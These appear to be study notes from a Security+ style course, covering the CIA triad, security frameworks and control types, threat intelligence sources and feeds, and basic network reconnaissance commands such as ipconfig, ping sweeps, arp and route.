# 1A
## Information Security
Information security (or infosec) refers to the protection of data resources from unauthorized access, attack, theft, or damage. Data may be vulnerable because of the way it is stored, the way it is transferred, or the way it is processed. The systems used to store, transmit, and process data must demonstrate the properties of security. Secure information has three properties, often referred to as the **CIA Triad**: 

-   ==Confidentiality== means that certain information should only be known to certain people. 
-   ==Integrity== means that the data is stored and transferred as intended and that modification is only done by authorized sources. 
-   ==Availability== means that information is accessible to those authorized to view or modify it. 

The triad can also be referred to as "AIC" to avoid confusion with the Central Intelligence Agency.  

Some security models and researchers identify other properties that secure systems should exhibit. The most important of these is non-repudiation. 

- ==Non-repudiation== means that a subject cannot deny doing something, such as creating, modifying, or sending a resource. For example, a legal document, such as a will, must usually be witnessed when it is signed. If there is a dispute about whether the document was correctly executed, the witness can provide evidence that it was.

## CYBERSECURITY FRAMEWORK

Within the goal of ensuring information security, cybersecurity refers specifically to provisioning secure processing hardware and software. Information security and cybersecurity tasks can be classified as **five functions**, following the framework developed by the National Institute of Standards and Technology (NIST) ([nist.gov/cyberframework/online-learning/five-functions](https://www.nist.gov/cyberframework/online-learning/five-functions)):

-   ==Identify==—develop security policies and capabilities. Evaluate risks, threats, and vulnerabilities and recommend security controls to mitigate them.
-   ==Protect==—procure/develop, install, operate, and decommission IT hardware and software assets with security as an embedded requirement of every stage of this operations life cycle.
-   ==Detect==—perform ongoing, proactive monitoring to ensure that controls are effective and capable of protecting against new types of threats.
-   ==Respond==—identify, analyze, contain, and eradicate threats to systems and data security.
-   ==Recover==—implement cybersecurity resilience to restore systems and data if other controls are unable to prevent attacks.
# 1B
## SECURITY CONTROL CATEGORIES

Information and cybersecurity assurance is usually considered to take place within an overall process of business risk management. Implementation of cybersecurity functions is often the responsibility of the IT department. There are many different ways of thinking about how IT services should be governed to fulfill overall business needs. Some organizations have developed IT service frameworks to provide best practice guides to implementing IT and cybersecurity. These frameworks can shape company policies and provide checklists of procedures, activities, and technologies that should ideally be in place. Collectively, these procedures, activities, and tools can be referred to as security controls.

A security control is something designed to give a system or data asset the properties of confidentiality, integrity, availability, and non-repudiation. Controls can be divided into three broad categories, representing the way the control is implemented:

-   ==Technical==—the control is implemented as a system (hardware, software, or firmware). For example, firewalls, antivirus software, and OS access control models are technical controls. Technical controls may also be described as logical controls.  
	-   Operate without much intervention once configured
-   ==Operational==—the control is implemented primarily by people rather than systems. For example, security guards and training programs are operational controls rather than technical controls.	
	-   Day-to-day administration of security system
	-   Tactical reporting and insights
	-   Controls that require people to implement or administer
	-   Standard operating procedures
-   ==Managerial==—the control gives oversight of the information system. Examples could include risk identification or a tool allowing the evaluation and selection of other security controls.
	- Oversight of the security system
	-   Strategic reporting and insights
	-   Risk assessment
	-   Security policies

## SECURITY CONTROL FUNCTIONAL TYPES

Security controls can also be classified in types according to the goal or function they perform:

-   ==Preventive==—the control acts to eliminate or reduce the likelihood that an attack can succeed. A preventative control operates before an attack can take place. Access control lists (ACL) configured on firewalls and file system objects are preventative-type controls. Anti-malware software also acts as a preventative control, by blocking processes identified as malicious from executing. Directives and standard operating procedures (SOPs) can be thought of as administrative versions of preventative controls.
	-   Reduce likelihood of attack
	-   Operate before/preceding an attack
	-   Examples include firewalls, anti-virus, encryption, ...
-   ==Detective==—the control may not prevent or deter access, but it will identify and record any attempted or successful intrusion. A detective control operates during the progress of an attack. Logs provide one of the best examples of detective-type controls.
	-   Identify or log signs of attack
	-   Operate during an attack
	-   Examples include intrusion detection, log review, physical inspections, ...
-   ==Corrective==—the control acts to eliminate or reduce the impact of an intrusion event. A corrective control is used after an attack. A good example is a backup system that can restore data that was damaged during an intrusion. Another example is a patch management system that acts to eliminate the vulnerability exploited during the attack.
	-   Reduce or eliminate impact of attack
	-   Operate after/following an attack
	-   Examples include backup, patch management, lessons learned, ...

While most controls can be classed functionally as preventative, detective, or corrective, a few other types can be used to define other cases:

-   ==Physical==—controls such as alarms, gateways, locks, lighting, security cameras, and guards that deter and detect access to premises and hardware are often classed separately.
-   ==Deterrent==—the control may not physically or logically prevent access, but psychologically discourages an attacker from attempting an intrusion. This could include signs and warnings of legal penalties against trespass or intrusion.
-   ==Compensating==—the control serves as a substitute for a principal control, as recommended by a security standard, and affords the same (or better) level of protection but uses a different methodology or technology.

## NIST CYBERSECURITY FRAMEWORK

A **cybersecurity framework (CSF)** is a list of activities and objectives undertaken to mitigate risks. The use of a framework allows an organization to make an objective statement of its current cybersecurity capabilities, identify a target level of capability, and prioritize investments to achieve that target. This is valuable for giving a structure to internal risk management procedures and provides an externally verifiable statement of regulatory compliance. Frameworks are also important because they save an organization from building its security program in a vacuum, or from building the program on a foundation that fails to account for important security concepts.

There are many different frameworks, each of which categorize cybersecurity activities and controls in slightly different ways. These frameworks are non-regulatory in the sense that they do not attempt to address the specific regulations of a specific industry but represent **"best practice"** in IT security governance generally. Most organizations will have historically chosen a particular framework; some may use multiple frameworks in conjunction.
## ISO AND CLOUD FRAMEWORKS

### International Organization for Standardization (ISO) 27K

The International Organization for Standardization (ISO) has produced a cybersecurity framework in conjunction with the International Electrotechnical Commission (IEC). The framework was established in 2005 and revised in 2013. Unlike the NIST framework, the ISO 27001 Information Security Management standard must be purchased ([iso.org/standard/54534.html](https://iso.org/standard/54534.html)). ISO 27001 is part of an overall 27000 series of information security standards, also known as 27K. Of these, 27002 classifies security controls, 27017 and 27018 reference cloud security, and 27701 focuses on personal data and privacy.

### ISO 31K

Where ISO 27K is a cybersecurity framework, ISO 31K ([iso.org/iso-31000-risk-management.html](https://www.iso.org/iso-31000-risk-management.html)) is an overall framework for enterprise risk management (ERM). ERM considers risks and opportunities beyond cybersecurity by including financial, customer service, competition, and legal liability factors. ISO 31K establishes best practices for performing risk assessments.

### Cloud Security Alliance

The not-for-profit organization Cloud Security Alliance (CSA) produces various resources to assist cloud service providers (CSP) in setting up and delivering secure cloud platforms. These resources can also be useful for cloud consumers in evaluating and selecting cloud services.

-   Security Guidance ([cloudsecurityalliance.org/research/guidance](https://cloudsecurityalliance.org/research/guidance))—a best practice summary analyzing the unique challenges of cloud environments and how on-premises controls can be adapted to them.
-   Enterprise reference architecture ([ea.cloudsecurityalliance.org](https://ea.cloudsecurityalliance.org/))—best practice methodology and tools for CSPs to use in architecting cloud solutions. The solutions are divided across a number of domains, such as risk management and infrastructure, application, and presentation services.
-   Cloud controls matrix ([cloudsecurityalliance.org/research/working-groups/cloud-controls-matrix](https://cloudsecurityalliance.org/research/working-groups/cloud-controls-matrix/))—lists specific controls and assessment guidelines that should be implemented by CSPs. For cloud consumers, the matrix acts as a starting point for cloud contracts and agreements as it provides a baseline level of security competency that the CSP should meet.

### Statements on Standards for Attestation Engagements (SSAE) Service Organization Control (SOC)

The Statements on Standards for Attestation Engagements (SSAE) are audit specifications developed by the American Institute of Certified Public Accountants (AICPA). These audits are designed to assure consumers that service providers—notably cloud providers, but including any type of hosted or third-party service—meet professional standards ([aicpa.org/interestareas/frc/assuranceadvisoryservices/serviceorganization-smanagement.html](https://www.aicpa.org/interestareas/frc/assuranceadvisoryservices/serviceorganization-smanagement.html)). Within SSAE No. 18 (the current specification), there are several levels of reporting:

-   Service Organization Control (SOC2)—evaluates the internal controls implemented by the service provider to ensure compliance with Trust Services Criteria (TSC) when storing and processing customer data. TSC refers to security, confidentiality, integrity, availability, and privacy properties. An SOC2 Type I report assesses the system design, while a Type II report assesses the ongoing effectiveness of the security architecture over a period of 6-12 months. SOC2 reports are highly detailed and designed to be restricted. They should only be shared with the auditor and regulators, and with important partners under non-disclosure agreement (NDA) terms.
-   SOC3—a less detailed report certifying compliance with SOC2. SOC3 reports can be freely distributed.

## BENCHMARKS AND SECURE CONFIGURATION GUIDES

Although a **framework gives a "high-level"**  view of how to plan IT services, it does not generally provide detailed implementation guidance. At a system level, the deployment of servers and applications is covered by benchmarks and secure configuration guides.

### Center for Internet Security (CIS)

The Center for Internet Security ([cisecurity.org](https://cisecurity.org/)) is a not-for-profit organization (founded partly by The SANS Institute). It publishes the well-known "The CIS Critical Security Controls." The CIS-RAM (Risk Assessment Method) can be used to perform an overall evaluation of security posture ([learn.cisecurity.org/cis-ram](https://learn.cisecurity.org/cis-ram)).

CIS also produces benchmarks for different aspects of cybersecurity. For example, there are benchmarks for compliance with IT frameworks and compliance programs, such as PCI DSS, NIST 800-53, SOX, and ISO 27000. There are also product-focused benchmarks, such as for Windows Desktop, Windows Server, macOS, Linux, Cisco, web browsers, web servers, database and email servers, and VMware ESXi. The CIS-CAT (Configuration Access Tool) can be used with automated vulnerability scanners to test compliance against these benchmarks ([cisecurity.org/cybersecurity-tools/cis-cat-pro/cis-cat-faq](https://www.cisecurity.org/cybersecurity-tools/cis-cat-pro/cis-cat-faq/)).

### OS/Network Appliance Platform/Vendor-specific Guides

Operating system (OS) best practice configuration lists the settings and controls that should be applied for a computing platform to work in a defined role, such as client workstation, authentication server, network switch/router/firewall, web/application server, and so on.

Most vendors will provide guides, templates, and tools for configuring and validating the deployment of network appliances, operating systems, web servers, and application/database servers. The security configurations for each of these devices will vary not only by vendor but by device and version as well. The vendor's support portal will host the configuration guides (along with setup/install guides and software downloads and updates) or they can be easily located using a web search engine.

There is also detailed guidance available from several organizations to cover both vendor-neutral deployments and to provide third-party assessment and advice on deploying vendor products. Apart from the CIS controls, some notable sources include:

-   Department of Defense Cyber Exchange provides Security Technical Implementation Guides (STIGs) with hardening guidelines for a variety of software and hardware solutions ([public.cyber.mil](https://public.cyber.mil/)).
-   National Checklist Program (NCP) by NIST provides checklists and benchmarks for a variety of operating systems and applications ([nvd.nist.gov/ncp/repository](https://nvd.nist.gov/ncp/repository)).

### Application Servers

Most application architectures use a client/server model. This means that part of the application is a client software program, installed and run on separate hardware to the server application code. The client interacts with the server over a network. Attacks can therefore be directed at the local client code, at the server application, or at the network channel between them. As well as coding issues, the applications need to take account of platform issues. The client application might be running in a computing host alongside other, potentially malicious, software. Code that runs on the client should not be trusted. The server-side code should implement routines to verify that input conforms to what is expected.

### Web Server Applications

A web application is a particular type of client/server architecture. A web application leverages existing technologies to simplify development. The application uses a generic client (a web browser), and standard network protocols and servers (HTTP/HTTPS). The specific features of the application are developed using code running on the clients and servers. Web applications are also likely to use a multi-tier architecture, where the server part is split between application logic and data storage and retrieval. Modern web applications may use even more distributed architectures, such as microservices and serverless.

The Open Web Application Security Project (OWASP) is a not-for-profit, online community that publishes several secure application development resources, such as the Top 10 list of the most critical application security risks ([owasp.org/www-project-top-ten](https://owasp.org/www-project-top-ten/)). OWASP has also developed resources, such as the Zed Attack Proxy and Juice Shop (a deliberately unsecure web application), to help investigate and understand penetration testing and application security issues.
## REGULATIONS, STANDARDS, AND LEGISLATION

The key frameworks, benchmarks, and configuration guides may be used to demonstrate compliance with a country's legal/regulatory requirements or with industry-specific regulations. **Due diligence is a legal term meaning that responsible persons have not been negligent in discharging their duties.** Negligence may create criminal and civil liabilities. Many countries have enacted legislation that criminalizes negligence in information management. In the US, for example, the Sarbanes-Oxley Act (SOX) mandates the implementation of risk assessments, internal controls, and audit procedures. The Computer Security Act (1987) requires federal agencies to develop security policies for computer systems that process confidential information. In 2002, the Federal Information Security Management Act (FISMA) was introduced to govern the security of data processed by federal government agencies. 

### Personal Data and the General Data Protection Regulation (GDPR)
### National, Territory, or State Laws
### Payment Card Industry Data Security Standard (PCI DSS)


## 3 Labs notes
```
 ipconfig returns information about local interfaces, such as IP address and netmask, default gateway, DNS servers, static or DHCP-assisgned configuration, MAC addresses, and host name.
```
# 2A
## VULNERABILITY, THREAT, AND RISK

As part of security assessment and monitoring, security teams must identify ways in which their systems could be attacked. These assessments involve vulnerabilities, threats, and risk:

-   ==#Vulnerability is a weakness that could be triggered accidentally or exploited intentionally to cause a security breach.== Examples of vulnerabilities include improperly configured or installed hardware or software, delays in applying and testing software and firmware patches, untested software and firmware patches, the misuse of software or communication protocols, poorly designed network architecture, inadequate physical security, insecure password usage, and design flaws in software or operating systems, such as unchecked user input.
-   ==#Threat is the potential for someone or something to exploit a vulnerability and breach security==. A threat may be intentional or unintentional. The person or thing that poses the threat is called a _threat actor_ or _threat agent._ The path or tool used by a malicious threat actor can be referred to as the _attack vector._
-   ==#Risk is the likelihood and impact (or consequence) of a threat actor exploiting a vulnerability==. To assess risk, you identify a vulnerability and then evaluate the likelihood of it being exploited by a threat and the impact that a successful exploit would have.

## Insider threat actors
- Shadow IT creates a new unmonitored attack surface for malicious adversaries to exploit

## ATTACK SURFACE AND ATTACK VECTORS

The attack surface is all the points at which a malicious threat actor could try to exploit a vulnerability. To evaluate the attack surface, you need to consider the type of threat actor. The attack surface for an external actor is (or should be) far smaller than that for an insider threat. The attack surface can be considered for a network as a whole, but is also analyzed for individual software applications. Minimizing the attack surface means restricting access so that only a few known endpoints, protocols/ports, and services/methods are permitted. Each of these must be assessed for vulnerabilities.

From the point-of-view of the threat actor, different parts of the attack surface represent potential attack vectors. An #attack_vector is the path that a threat actor uses to gain access to a secure system. In the majority of cases, gaining access means being able to run malicious code on the target.

-   Direct access—this is a type of physical or local attack. 
-   Removable media—the attacker conceals malware on a USB thumb drive or memory card and tries to trick employees into connecting the media to a PC, laptop, or smartphone. 
-   Email—the attacker sends a malicious file attachment via email, or via any other communications system that allows attachments. 
-   Remote and wireless—the attacker either obtains credentials for a remote access or wireless connection to the network or cracks the security protocols used for authentication. Alternatively, the attacker spoofs a trusted resource, such as an access point, and uses it to perform credential harvesting and then uses the stolen account details to access the network.
-   Supply chain—rather than attack the target directly, a threat actor may seek ways to infiltrate it via companies in its supply chain. One high-profile example of this is the Target data breach, which was made via the company's HVAC supplier ([krebsonsecurity.com/2014/02/target-hackers-broke-in-via-hvac-company](https://krebsonsecurity.com/2014/02/target-hackers-broke-in-via-hvac-company/)).
-   Web and social media—malware may be concealed in files attached to posts or presented as downloads. 
-   Cloud—many companies now run part or all of their network services via Internet-accessible clouds. 

Sophisticated threat actors will make use of multiple vectors. They are likely to plan a multi-stage campaign, rather than a single "smash and grab" type of raid.
# 2B
## THREAT RESEARCH SOURCES

Threat research is a counterintelligence gathering effort in which security companies and researchers attempt to discover the tactics, techniques, and procedures (TTPs) of modern cyber adversaries. There are many companies and academic institutions engaged in primary cybersecurity research. Security solution providers with firewall and anti-malware platforms derive a lot of data from their own customers' networks. As they assist customers with cybersecurity operations, they are able to analyze and publicize TTPs and their indicators. These organizations also operate **honeynets** to try to observe how hackers interact with vulnerable systems. 

Another primary source of threat intelligence is the dark web. The deep web is any part of the World Wide Web that is not indexed by a search engine. This includes pages that require registration, pages that block search indexing, unlinked pages, pages using nonstandard DNS, and content encoded in a nonstandard manner. Within the deep web, are areas that are deliberately concealed from "regular" browser access.

-   ==Dark net== a network established as an overlay to Internet infrastructure by software, such as The Onion Router (TOR), Freenet, or I2P, that acts to anonymize usage and prevent a third party from knowing about the existence of the network or analyzing any activity taking place over the network. Onion routing, for instance, uses multiple layers of encryption and relays between nodes to achieve this anonymity.
-   ==Dark web== sites, content, and services accessible only over a dark net. While there are dark web search engines, many sites are hidden from them. Access to a dark web site via its URL is often only available via "word of mouth" bulletin boards.

![Screenshot of AlphaBay Market showing "Tor circuit for this site" with 8 steps including IP addresses in Italy, Sweden, and Germany.](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/2941-1599771794384.png)

Using the TOR browser to view the AlphaBay market, now closed by law enforcement. (Screenshot used with permission from Security Onion.)

Investigating these dark web sites and message boards is a valuable source of counterintelligence. The anonymity of dark web services has made it easy for investigators to infiltrate the forums and webstores that have been set up to exchange stolen data and hacking tools. As adversaries react to this, they are setting up new networks and ways of identifying law enforcement infiltration. Consequently, dark nets and the dark web represent a continually shifting landscape.
## THREAT INTELLIGENCE PROVIDERS

The outputs from the primary research undertaken by security solutions providers and academics can take three main forms:

-   ==Behavioral threat research== narrative commentary describing examples of attacks and TTPs gathered through primary research sources.
-   ==Reputational threat intelligence== lists of IP addresses and domains associated with malicious behavior, plus signatures of known file-based malware.
-   ==Threat data== computer data that can correlate events observed on a customer's own networks and logs with known TTP and threat actor indicators.

Threat data can be packaged as feeds that integrate with a **security information and event management (SIEM)** platform. These feeds are usually described as cyber threat intelligence (CTI) data. The data on its own is not a complete security solution however. To produce actionable intelligence, the threat data must be correlated with observed data from customer networks. This type of analysis is often powered by artificial intelligence (AI) features of the SIEM.

Threat intelligence platforms and feeds are supplied as one of four different commercial models:

-   **Closed/proprietary—the threat research and CTI data is made available as a paid subscription to a commercial threat intelligence platform.** The security solution provider will also make the most valuable research available early to platform subscribers in the form of blogs, white papers, and webinars. Some examples of such platforms include:
-   IBM X-Force Exchange ([exchange.xforce.ibmcloud.com](https://exchange.xforce.ibmcloud.com/))
-   FireEye ([fireeye.com/solutions/cyber-threat-intelligence/threat-intelligence-subscriptions.html](https://www.fireeye.com/mandiant/threat-intelligence/threat-intelligence-subscriptions.html))
-   Recorded Future ([recordedfuture.com/solutions/threat-intelligence-feeds](https://www.recordedfuture.com/solutions/threat-intelligence-feeds/))

![](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/1367-1599771794506.png)

IBM X-Force Exchange threat intelligence portal. (Image copyright 2019 IBM Security exchange.xforce.ibmcloud.com.)

-   Vendor websites—proprietary threat intelligence is not always provided at cost. All types of security, hardware, and software vendors make huge amounts of threat research available via their websites as a general benefit to their customers. One example is Microsoft's Security Intelligence blog ([microsoft.com/security/blog/microsoft-security-intelligence](https://www.microsoft.com/security/blog/microsoft-security-intelligence/)).
-   Public/private information sharing centers—in many critical industries, Information Sharing and Analysis Centers (ISACs) have been set up to share threat intelligence and promote best practice ([nationalisacs.org/member-isacs](https://www.nationalisacs.org/member-isacs-3)). These are sector-specific resources for companies and agencies working in critical industries, such as power supply, financial markets, or aviation. Where there is no coverage by an ISAC, local industry groups and associations may come together to provide mutual support.
-   Open source intelligence (OSINT)—some companies operate threat intelligence services on an open-source basis, earning income from consultancy rather than directly from the platform or research effort. Some examples include:
-   AT&T Cybersecurity, previously Alien Vault Open Threat Exchange (OTX) ([otx.alienvault.com](https://otx.alienvault.com/))
-   Malware Information Sharing Project (MISP) ([misp-project.org/feeds](https://misp-project.org/feeds/))
-   Spamhaus ([spamhaus.org/organization](https://www.spamhaus.org/organization/))
-   VirusTotal ([virustotal.com](https://www.virustotal.com/gui/home/upload))

As well as referring to open-source threat research providers, OSINT can mean any intelligence derived from publicly available information. OSINT is a common reconnaissance technique where the attacker harvests domains, IP address ranges, employees, and other data that will assist in identifying attack vectors. Companies should also monitor public networks for signs of attack planning (chatter on forums) and breaches (confidential information or account credentials posted to online forums). Most commercial providers offer monitoring services, which can include dark web sources ([fireeye.com/content/dam/fireeye-www/products/pdfs/pf/intel/ds-digital-threat-monitoring.pdf](https://wmx-api-production.s3.amazonaws.com/courses/5731/supplementary/ds-digital-threat-monitoring.pdf)).
## OTHER THREAT INTELLIGENCE RESEARCH SOURCES

There are plenty of other sources of best practice advice and new research other than the threat intelligence platforms:

-   Academic journals—results from academic researchers and not-for-profit trade bodies and associations, such as the IEEE, are published as papers in journals. Access to these papers is usually subscription-based. One free source is the arXiv preprint repository ([arxiv.org/list/cs.CR/recent](https://arxiv.org/list/cs.CR/recent)). Preprints are papers that have not been published or peer reviewed.
-   Conferences—security conferences are hosted and sponsored by various institutions and provide an opportunity for presentations on the latest threats and technologies.
-   Request for Comments (RFC)—when a new technology is accepted as a web standard, it is published as an RFC by the W3C ([rfc-editor.org](https://www.rfc-editor.org/)). There are also informational RFCs covering many security considerations and best practices.
-   Social media—companies and individual researchers and practitioners write informative blogs or social media feeds. There are too many useful blog and discussion sources to include here, but the list curated by Digital Guardian ([digitalguardian.com/blog/top-50-infosec-blogs-you-should-be-reading](https://digitalguardian.com/blog/top-50-infosec-blogs-you-should-be-reading)) is a good starting point.

As well as a source of information, social media should also be monitored for threat data ([trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/hunting-threats-on-twitter](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/hunting-threats-on-twitter)).
## TACTICS, TECHNIQUES, AND PROCEDURES AND INDICATORS OF COMPROMISE

A tactic, technique, or procedure (TTP) is a generalized statement of adversary behavior. The term is derived from US military doctrine ([mwi.usma.edu/what-is-army-doctrine](https://mwi.usma.edu/what-is-army-doctrine/)). TTPs categorize behaviors in terms of campaign strategy and approach (tactics), generalized attack vectors (techniques), and specific intrusion tools and methods (procedures).

An **indicator of compromise (IoC)** is a residual sign that an asset or network has been successfully attacked or is continuing to be attacked. Put another way, an IoC is evidence of a TTP.

> TTPs describe what and how an adversary acts and Indicators describe how to recognize what those actions might look like. ([stixproject.github.io/documentation/concepts/ttp-vs-indicator](https://stixproject.github.io/documentation/concepts/ttp-vs-indicator/))

As there are many different targets and vectors of an attack, so too are there many different potential IoCs. The following is a list of some IoCs that you may encounter:

-   Unauthorized software and files
-   Suspicious emails
-   Suspicious registry and file system changes
-   Unknown port and protocol usage
-   Excessive bandwidth usage
-   Rogue hardware
-   Service disruption and defacement
-   Suspicious or unauthorized account usage

An IoC can be definite and objectively identifiable, like a malware signature, but often IoCs can only be described with confidence via the correlation of many data points. Because these IoCs are often identified through patterns of anomalous activity rather than single events, they can be open to interpretation and therefore slow to diagnose. Consequently, threat intelligence platforms use AI-backed analysis to speed up detection without overwhelming analysts' time with false positives.

Strictly speaking, an IoC is evidence of an attack that was successful. The term **indicator of attack (IoA)** is sometimes also used for evidence of an intrusion attempt in progress.
## THREAT DATA FEEDS

When you use a **cyber threat intelligence (CTI)** platform, you subscribe to a threat data feed. The information in the threat data can be combined with event data from your own network and system logs. An analysis platform performs correlation to detect whether any IoCs are present. There are various ways that a threat data feed can be implemented.

### Structured Threat Information eXpression (STIX)

The OASIS CTI framework ([oasis-open.github.io/cti-documentation](https://oasis-open.github.io/cti-documentation/)) is designed to provide a format for this type of automated feed so that organizations can share CTI. **The Structured Threat Information eXpression (STIX)** part of the framework describes standard terminology for IoCs and ways of indicating relationships between them.

![Diagram showing a STIX 2 Relationship example](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/2714-1599771794586.png)

STIX 2 Relationship example. (Icon images © Copyright 2016 Bret Jordan. Licensed under the Creative Commons Attribution-ShareAlike (CC BY-SA) License, Version 4.0. ([freetaxii.github.io/stix2-icons.html](https://freetaxii.github.io/stix2-icons.html).)

Where STIX provides the syntax for describing CTI, the Trusted Automated eXchange of Indicator Information (TAXII) protocol provides a means for transmitting CTI data between servers and clients. For example, a CTI service provider would maintain a repository of CTI data. Subscribers to the service obtain updates to the data to load into analysis tools over TAXII. This data can be requested by the client (referred to as a _collection_), or the data can be pushed to subscribers (referred to as a _channel_).

### Automated Indicator Sharing (AIS)

Automated Indicator Sharing (AIS) is a service offered by the Department of Homeland Security (DHS) for companies to participate in threat intelligence sharing ([us-cert.gov/ais](https://us-cert.cisa.gov/ais)). It is especially aimed at ISACs, but private companies can join too. AIS is based on the STIX and TAXII standards and protocols. 

### Threat Maps

A threat map is an animated graphic showing the source, target, and type of attacks that have been detected by a CTI platform. The security solutions providers publish such maps showing global attacks on their customers' systems ([fortinet.com/fortiguard/threat-intelligence/threat-map](https://www.fortinet.com/fortiguard/threat-intelligence/threat-map)). 

### File/Code Repositories

A file/code repository such as [virustotal.com](https://www.virustotal.com/) holds signatures of known malware code. The code samples derive from live customer systems and (for public repositories) files that have been uploaded by subscribers.

### Vulnerability Databases and Vulnerability Feeds

As well as analyzing adversary tools and behaviors, another source of threat intelligence is identifying vulnerabilities in OS, software application, and firmware code. Security researchers look for vulnerabilities, often for the reward of bug bounties offered by the vendor. Lists of vulnerabilities are stored in databases such as Common Vulnerabilities and Exposures (CVE), operated by Mitre ([cve.mitre.org](https://cve.mitre.org/)). Information about vulnerabilities is codified as signatures and scanning scripts that can be supplied as feeds to automated vulnerability scanning software.
## ARTIFICIAL INTELLIGENCE AND PREDICTIVE ANALYSIS

A threat data feed does not produce threat intelligence automatically. The combination of security intelligence and CTI data can be processed, correlated, and analyzed to provide actionable insights that will assist you in identifying security problems. For example, security intelligence reveals that DDoS attacks were perpetrated against your web services from a range of IP addresses by collecting log and network traffic data. Threat intelligence associates those IP addresses with a hacktivist group. By linking the two sources of intelligence, you can identify goals and tactics associated with that group and use controls to mitigate further attacks. Most threat intelligence platforms use some sort of artificial intelligence (AI) to perform correlation analysis.

### AI and Machine Learning

AI is the science of creating machine systems that can simulate or demonstrate a similar general intelligence capability to humans. Early types of AI—expert systems—use if-then rules to draw inferences from a limited data set, called a _knowledge base._ Machine learning (ML) uses algorithms to parse input data and then develop strategies for using that data, such as identifying an object as a type, working out the best next move in a game, and so on. Unlike an expert system, machine learning can modify the algorithms it uses to parse data and develop strategies. It can make gradual improvements in the decision-making processes. The structure that facilitates this learning process is referred to as an artificial neural network (ANN). Nodes in a neural network take inputs and then derive outputs, using complex feedback loops between nodes. An ML system has objectives and error states and it adjusts its neural network to reduce errors and optimize objectives.

In terms of threat intelligence, this AI-backed analysis might perform accurate correlations that would take tens or hundreds of hours of analyst time if the data were to be examined manually.

### Predictive Analysis

Identifying the signs of a past attack or the presence of live attack tools on a network quickly is valuable. However, one of the goals of using AI-backed threat intelligence is to perform predictive analysis, or threat forecasting. This means that the system can anticipate a particular type of attack and possibly the identity of the threat actor before the attack is fully realized. For example, the system tags references to a company, related IP addresses, and account names across a range of ingested data from dark web sources, web searches, social media posts, phishing email attempts, and so on. The analysis engine associates this "chatter" with IP addresses that it can correlate with a known adversary group. This gives the target advance warning that an attack is in the planning stages and more time to prepare an effective defense.

Such concrete threat forecasting is not a proven capability of any commercial threat intelligence platform at the time of writing. However, predictive analysis can inform risk assessment by giving more accurate, quantified measurements of the likelihood and impact (cost) of breach-type events.
# 3A
## LESSON INTRODUCTION

Security assessment refers to processes and tools that evaluate the attack surface. With knowledge of adversary tactics and capabilities, you can assess whether points on the attack surface are potentially vulnerable attack vectors. The output of assessment is recommendations for deploying, enhancing, or reconfiguring security controls to mitigate the risk that vulnerabilities are exploitable by threat actors. 

Lesson Objectives

In this lesson, you will:

-   Assess organizational security with network reconnaissance tools.
-   Explain security concerns with general vulnerability types.
-   Summarize vulnerability scanning techniques.
-   Explain penetration testing concepts.

EXAM OBJECTIVES COVERED

4.1 Given a scenario, use the appropriate tool to assess organizational security

Reconnaissance is a type of assessment activity that maps the potential attack surface by identifying the nodes and connections that make up the network. You will often need to run scans using both command line and GUI topology discovery tools. You will need to report host configurations using fingerprinting tools and capture and analyze network traffic. You should also understand how tools can be used to operate backdoor connections to a host and to covertly exfiltrate data.
## ipconfig, ping, and ARP
The process of mapping out the attack surface is referred to as network reconnaissance and discovery. Reconnaissance techniques are used by threat actors, but they can also be used by security professionals to probe and test their own security systems, as part of a security assessment and ongoing monitoring.

_Topology discovery_ (or "footprinting") means scanning for hosts, IP ranges, and routes between networks to map out the structure of the target network. Topology discovery can also be used to build an asset database and to identify non-authorized hosts (rogue system detection) or network configuration errors. 

Basic topology discovery tasks can be accomplished using the command line tools built into Windows and Linux. The following tools report the IP configuration and test connectivity on the local network segment or subnet.

-   ipconfig—show the configuration assigned to network interface(s) in Windows, including the hardware or media access control (MAC) address, IPv4 and IPv6 addresses, **default gateway, and whether the address is static or assigned by DHCP. If the address is DHCP-assigned, the output also shows the address of the DHCP server that provided the lease (To detect spoofing).  
-   ifconfig—show the configuration assigned to network interface(s) in Linux.
-   ping—probe a host on a particular IP address or host name using Internet Control Message Protocol (ICMP). You can use ping with a simple script to perform a sweep of all the IP addresses in a subnet. The following example will scan the 10.1.0.0/24 subnet from a Windows machine:

for /l %i in (1,1,255) do @ping -n 1 -w 100 10.1.0.%i | find /i "reply"

![Screenshot shows 6 reply lines; the first line is "Reply from 10.1.0.1: bytes=32 time<1ms TTL=128". The IP address for each reply begins with 10.1.0.](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/9493-1599771794671.png)

Performing a ping sweep in Windows with a For loop—Searching multiple octets requires nested loops. Note that not all hosts respond to ICMP probes. (Screenshot used with permission from Microsoft.)

-   arp—display the local machine's Address Resolution Protocol (ARP) cache. The ARP cache shows the MAC address of the interface associated with each IP address the local host has communicated with recently. This can be useful if you are investigating a suspected spoofing attack. For example, a sign of a man-in-the-middle attack is where the MAC address of the default gateway IP listed in the cache is not the legitimate router's MAC address.

For more information about commands, including syntax usage, look up the command in an online resource for Windows ([docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands)) or Linux ([linux.die.net/man](https://linux.die.net/man/)).

In Linux, commands such as ifconfig, arp, route, and traceroute are deprecated and the utilities have not been updated for some years. The iproute2 suite of tools supply replacements for these commands ([digitalocean.com/community/tutorials/how-to-use-iproute2-tools-to-manage-network-configuration-on-a-linux-vps](https://www.digitalocean.com/community/tutorials/how-to-use-iproute2-tools-to-manage-network-configuration-on-a-linux-vps)).

## ROUTE AND TRACEROUTE

The following tools can be used to test the routing configuration and connectivity with remote hosts and networks.

-   route—view and configure the host's local routing table. Most end systems use a default route to forward all traffic for remote networks via a gateway router. If the host is not a router, additional entries in the routing table could be suspicious **(To detect spoofing)** .

![](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/8872-1599771794749.png)

Output from the route command on a Linux host. Most endpoints have a simple routing table, similar to this. It shows the default route (0.0.0.0/0) via the host configured as the default gateway (10.1.0.254) over the network interface eth0. The second line of the table shows the subnet for local traffic (10.1.0.0/24). This network is directly connected, represented by the 0.0.0.0 gateway.

-   tracert—uses ICMP probes to report the round trip time (RTT) for hops between the local host and a host on a remote network. tracert is the Windows version of the tool.
-   traceroute—performs route discovery from a Linux host. traceroute uses UDP probes rather than ICMP, by default.
